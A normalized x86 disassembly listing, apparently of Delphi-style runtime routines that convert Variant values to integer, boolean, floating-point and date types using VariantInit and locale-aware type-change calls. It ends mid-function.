push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410c4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4132dc
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4043a8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408770
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c55
lea eax [ ebp - 0x1c ]
call sub_404120
lea eax [ ebp - 0xc ]
call sub_40482c
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402b60
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40f280
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_411314
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_410c60
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410cb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f94c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410d18
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410cbe
lea eax [ ebp - 0x18 ]
call sub_40f624
retn
sub_410ccc
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41670c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410d18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_411124
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410d4b ]
mov eax [ ebp - 0x4 ]
call sub_410b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410d18
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410ab4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410c60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40edec
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_410ccc
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_410ab4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_410ab4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_410f6f ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410b60
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410d18
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_41115c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411213
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_4132dc
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4043a8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_40885c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41121a
lea eax [ ebp - 0x10 ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_40482c
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40f280
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40f280
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_411224
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40f280
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_411264
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4112b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f94c
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_411314
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4112bf
lea eax [ ebp - 0x11 ]
call sub_40f624
retn
sub_4112c8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41670c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_411314
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41132e ]
mov eax ebx
call sub_41115c
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_41115c
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_411314
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_411224
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_411264
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40edec
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4112c8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411224
mov [ esp ] al
mov eax ebx
call sub_411224
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_4114f0 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_41115c
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_411314
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_411668
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41171d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4132dc
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4043a8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409aa0
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40f280
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40f280
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411724
lea eax [ ebp - 0x1c ]
call sub_404120
lea eax [ ebp - 0xc ]
call sub_40482c
retn
sub_41172c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40f280
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411778
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4117cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f94c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411828
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4117d4
lea eax [ ebp - 0x18 ]
call sub_40f624
retn
sub_4117dc
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41670c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411828
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411844 ]
mov eax ebx
call sub_411668
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411668
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411828
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41172c
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411778
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40edec
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4117dc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_41172c
fstp [ esp ]
fwait
mov eax ebx
call sub_41172c
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411a21 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411668
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411828
fstp [ esp ]
fwait
jmp r-xdata
sub_411bc0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_411d25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_411828
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_411be2 ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40edec
sub_411d50
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411e2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4132dc
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4043a8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40b33c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411e33
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0xc ]
call sub_40482c
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4043a8
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_409abc
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40f280
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40f280
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411e3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40f280
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411e9c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40f280
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411ee8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
